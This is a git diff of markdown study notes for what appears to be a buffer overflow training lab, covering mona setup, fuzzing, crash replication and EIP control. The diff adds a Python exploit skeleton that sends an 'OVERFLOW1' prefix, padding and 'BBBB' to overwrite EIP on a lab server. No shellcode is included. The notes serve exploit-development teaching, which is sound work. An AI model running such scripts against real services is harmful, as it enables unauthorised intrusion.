@@ -3,7 +3,7 @@
 
 ---
 
-1. Mona Configuration
+### Mona Configuration
 
 - The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
 
@@ -11,15 +11,15 @@
 
 ---
 
-2. Fuzzing
+### 1. Fuzzing
 
-    - The fuzzer will send increasingly long strings comprised of `A`. 
+- The fuzzer will send increasingly long strings comprised of `A`. 
     
-    - If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
+- If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
     
-    - Make a note of the largest number of bytes that were sent.
+- Make a note of the largest number of bytes that were sent.
 
-- `python_fuzzing.py` (chmod +x)
+    - `python_fuzzing.py` (chmod +x)
 
 ```python
 #!/usr/bin/env python3
@@ -54,7 +54,7 @@ while True:
 
 ---
 
-3. Crash Replication & Controlling EIP
+### 2. Crash Replication & Controlling EIP
 
 - Run the following command to generate a cyclic pattern of a length `400 bytes` longer ([Ax100,Ax100]:200+400) that the string that crashed the server (change the -l value to this):
 
@@ -66,7 +66,9 @@ while True:
 
     - `python_exploit.py` (chmod +x)
 
-```
+- **Empty version:**
+
+```python
 import socket
 
 ip = "10.10.56.134"
@@ -107,7 +109,7 @@ except:
 
     - `EIP contains normal pattern : ... (offset XXXX)` 
     
-1. Update your `exploit.py` script and set the `offset` variable to this value **(was previously set to 0)**. 
+1. Update your `exploit.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**. 
 
 2. Set the `payload` variable to an **empty string again**. 
 
@@ -117,6 +119,38 @@ except:
 
     - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 
 
+    - `python_exploit.py` (chmod +x)
+
+- **Final Script:**
+
+```python
+import socket
+
+ip = "10.10.56.134"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+
 ---  
 
-4. Finding Bad Characters
+### 3. Finding Bad Characters
